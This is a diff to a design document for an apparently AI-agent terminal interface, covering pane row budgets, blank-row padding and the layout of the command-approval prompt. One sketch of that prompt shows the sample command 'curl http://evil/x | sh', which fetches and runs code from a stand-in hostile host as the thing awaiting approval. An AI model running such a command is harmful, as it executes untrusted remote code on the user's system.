@@ -121,7 +121,10 @@ border directly on the `▔` hairline, with no empty row painted against it. Tha
 above the hairline now read the same way rather than each carrying a spacer the others did not. With
 no pane open nothing moves: the gap row still lands directly above the `▔`, exactly where it always
 did. Which side of the slot the row falls on is a stacking question and not a budget one — the frame
-spends the one row in every composition — so none of the arithmetic below knows about it.
+spends the one row in every composition — so none of the arithmetic below knows about it. The blank
+a pane keeps above its key legend (below) is not a counter-example: that row is INSIDE the box,
+between the pane's rows and its hint, and the bottom border still seats on the `▔` with nothing
+between the two.
 
 **A short window shrinks the panes rather than pushing the box off-screen.** A pane never promises
 rows the frame cannot hold: it spends what the window can spare above the input box, so a long
@@ -227,16 +230,42 @@ short would seat one that cannot be drawn. What differs is the chrome each pane 
 The `/sessions` browser, the picker and the dropdown spend all four — two borders, a title row and a
 key hint — so at the floor they show no rows AND no prose, rather than keeping one row back for
 either; they still say what they are and how to act, which is the least a pane can be and still be
-worth drawing. The **approval prompt** spends two: its name rides the top border and it draws no
+worth drawing. Four is a floor SHAPE rather than a pane's usual one: the blanks the rule below sets
+around a pane's rows are already given up at that height, so a pane drawn in four rows is its chrome
+and nothing else, and it wins those blanks back only once the window can pay for both of them and
+still seat a row. The **approval prompt** spends two: its name rides the top border and it draws no
 hint row at all, its shortcut letters being written beside the options they take, so the other two
 rows are one line of body and one decision row. The **ask prompt** spends three — two borders and
 its hint — and puts the fourth into the first line of the question, its name having gone into the
 question itself; where the question is too long to be that one line, the row goes to the elision
 marker and the question's lead moves up onto the border, which costs the pane nothing. What no pane
-may do is claim a fifth row the frame has not got. Under the eight
+may do is claim a fifth row the frame has not got — and the blanks below are not that fifth row:
+they are spent INSIDE the rows the pane was granted, booked out of its own window before its rows
+are seated, which is exactly why they are the first thing it hands back. Under the eight
 rows of fixed chrome below the session area, that puts the shortest terminal a pane can be drawn in
 at all at **twelve rows** — and at twelve the session area is already gone, so the frame is exactly
 the pane and the chrome together.
+
+**Above that floor a pane breathes: one blank row over its row block, one under it.** A pane's rows
+are a block rather than more of the prose above them — on a decision surface the body asks and the
+rows answer — so a blank sets the block off from whatever stands over it and a second closes it off
+from the key legend beneath. Both are house rules rather than one pane's taste, and both are the
+BUILDER's to state: the painter draws the pads it is asked for and defaults neither, exactly as it
+already does for the body's own pads (ADR 0053). Every boxed pane asks for the opening blank unless
+the line above its block is already one — `/settings`, whose body closes on a blank, and any list
+showing a typed `filter:` line — and asks for the closing blank whenever it has a hint, which is why
+the hintless approval prompt opens on a blank and closes on its border, and why a pane with no rows
+at all still keeps the blank above its legend: a legend flush under prose reads as that prose's last
+line rather than as the pane's footer. **The pair is booked out of the row window before the rows
+are seated against what is left**, which is the only ordering under which an overflowing list
+breathes too — spent afterwards the blanks would come out of the lines the seated window left over,
+and a window that overflowed leaves none, so the pane with the most rows to read would have been the
+one pane without the blanks that make them readable. **And they give way first, together.** Where
+what remains cannot seat the anchor row, both pads are handed back to the rows at once — never one,
+because half a pad moves the block instead of setting it off — and the pane is down to the floor
+shape above. That is the order the `filter:` line already obeys further down (the rows go first,
+then its two blanks together, and the line itself last), and it is why the at-the-floor sketches in
+this document show no blanks at all.
 
 **One pane may claim the whole budget: the full-height class.** Every pane above spends what the
 window can *spare* — the session area keeps a three-row reserve, and only the surplus past it makes a
@@ -455,8 +484,10 @@ window a two-argument call whose command runs to twenty lines reads
 ```
 ╭───────────────────────────── Approve terminal? ──────────────────────────────╮
 │ Reason: subprocess execution                                                 │
+│                                                                              │
 │ workdir:                                                                     │
 │   /ws/a                                                                      │
+│                                                                              │
 │ command:                                                                     │
 │ … (+7 more lines)                                                            │
 │   curl http://evil/x | sh                                                    │
@@ -465,7 +496,11 @@ window a two-argument call whose command runs to twenty lines reads
 ╰──────────────────────────────────────────────────────────────────────────────╯
 ```
 
-— both keys on the screen, and the line the decision actually turns on with them.
+— both keys on the screen, and the line the decision actually turns on with them. Every part of the
+body is a paragraph, one blank line apart, and those blanks are body LINES like any other: a tighter
+window elides them into the very marker above, so a pane loses its paragraphs before it loses a key.
+The blank over `❯ Allow` is the other kind — the pad that sets the menu off from the body — and it
+is booked out of the pane's rows, not its body.
 
 **The rows are counted the same way, when there is no window for them at all.** A row window the
 pane did get scrolls around the selection, so the entries outside it are one keypress away and need
@@ -1714,7 +1749,10 @@ the report — and, because the pane is not modal, that click still lands where 
 the caret in the prompt or starts a transcript selection exactly as it would have with no report up. A
 click **inside** the box does nothing at all, and is swallowed rather than dragging a selection across
 the transcript drawn under it. The **wheel** scrolls the rows one notch at a time where a session fanned
-out to more delegates than the pane was granted rows for, clamped at both ends — a scroll must not roll
+out to more delegates than the pane was granted rows for — a window two rows smaller than the pane's
+own, the report's rows keeping the house blank under the column header and the one over the hint
+like every other pane's block, so a spend list scrolls two rows sooner than a count of its rows
+alone would suggest — clamped at both ends — a scroll must not roll
 past the last row and land back on the first — and the column header scrolls with them, being a row of
 the list like any other. The report does not follow its tail as the other two panes do: a delegate row
 appearing while it is open leaves the window where the reader put it, because this pane is a reading of
@@ -1888,7 +1926,9 @@ same pane over workspace files. At most eight rows show — and fewer than eight
 cannot spare eight, because the dropdown answers to the same row budget every pane does (the
 section above): a short terminal scrolls a smaller window around the selected row, and one with no
 rows to give counts the whole menu onto the title row rather than opening an empty pane under a
-hint still offering `↑/↓ select`. The hint line under the rows reads
+hint still offering `↑/↓ select`. Those eight rows are a block, set off by the house blank under the
+title and closed by the one over the hint, and the two go before the eighth row does. The hint line
+under the rows reads
 `↑/↓ select · ⏎/tab accept · esc dismiss`. The rows rank by **match quality** — an exact name
 first, then the names the typed partial starts, then the ones that merely contain it — and rows of
 equal quality keep the scan order behind the menu: the commands, alphabetically, and then the
@@ -1947,7 +1987,8 @@ accepting their row runs them like any other. Accepting a skill row writes that 
 them open a
 picker: the same bordered pane as the `/sessions` browser, one row per choice, one highlight,
 `type to filter · ↑/↓ select · ⏎ switch · esc close` under it, at most eight rows with a window
-scrolling around the selection. It is modal — while it is open every key belongs to it. `/server` lists the servers
+scrolling around the selection — set off, like the browser's, by the house blank under the title and
+the one over the hint. It is modal — while it is open every key belongs to it. `/server` lists the servers
 `config.yaml` names plus the one this session started on, in three columns — `name`, `— endpoint`,
 `· current` — and the row the session is on is the one that fills the third, faintly; picking it
 says so instead of switching. **The second server-kind question is `/sub-agents-server`**, which
